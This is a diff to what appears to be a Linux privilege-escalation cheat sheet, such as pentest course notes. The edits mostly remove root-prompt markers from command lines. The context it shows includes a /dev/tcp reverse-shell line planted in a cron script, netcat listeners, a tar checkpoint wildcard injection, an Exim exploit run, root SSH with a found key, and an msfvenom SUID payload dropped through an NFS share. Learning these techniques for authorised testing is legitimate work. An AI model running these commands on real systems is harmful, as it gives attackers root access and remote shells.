@@ -122,8 +122,8 @@
 		- Detection
 
 			- $ uname -a
-			- # searchsploit linux kernel
-			- # ./linux-exploit-suggester-2.pl -k 2.6.32
+			- searchsploit linux kernel
+			- ./linux-exploit-suggester-2.pl -k 2.6.32
 
 		- Exploitation
 
@@ -229,8 +229,8 @@
 					- $ grep PermitRootLogin /etc/ssh/sshd_config
 					- PermitRootLogin yes?
 
-						- # chmod 600 root_key
-						- # ssh -i root_key root@$IP
+						- chmod 600 root_key
+						- ssh -i root_key root@$IP
 
 	- Sudo
 
@@ -333,7 +333,7 @@ system("/bin/bash -p");
 					- $ ls -l /usr/local/bin/overwrite.sh
 					- #!/bin/bash
 bash -i >& /dev/tcp/$IP/$PORT 0>&1
-					- # nc –nvlp $PORT
+					- nc –nvlp $PORT
 
 		- PATH Environment Variable
 
@@ -368,7 +368,7 @@ $ ls *
 				- $ chmod +x /home/user/shell.elf
 				- $ touch /home/user/--checkpoint=1
 $ touch /home/user/--checkpoint-action=exec=shell.elf
-				- # nc -nvlp $PORT
+				- nc -nvlp $PORT
 
 	- SUID / SGID
 
@@ -394,7 +394,7 @@ $ touch /home/user/--checkpoint-action=exec=shell.elf
 			- Exploitation
 
 				- $ /usr/sbin/exim-4.84-3 --version
-				- # searchsploit exim 4.84
+				- searchsploit exim 4.84
 				- $ sed -e "s/^M//" 39535.sh > privesc.sh
 				- $ chmod + privesc.sh
 				- $ ./privesc.sh
@@ -508,8 +508,8 @@ $ export –f /usr/sbin/service
 			- Exploitation
 
 				- $ cat /.ssh/root_key
-				- # chmod 600 root_key
-				- # ssh -i root_key root@$IP
+				- chmod 600 root_key
+				- ssh -i root_key root@$IP
 
 	- NFS
 
@@ -524,8 +524,8 @@ $ export –f /usr/sbin/service
 
 				- $ cat /etc/exports
 				- $ showmount -e $IP
-				- # mkdir /tmp/nfs
-# mount -o rw,vers=2 $IP:/tmp /tmp/nfs
+				- mkdir /tmp/nfs
+				- mount -o rw,vers=2 $IP:/tmp /tmp/nfs
 				- # msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 				- # chmod +xs /tmp/nfs/shell.elf
 				- $ /tmp/shell.elf
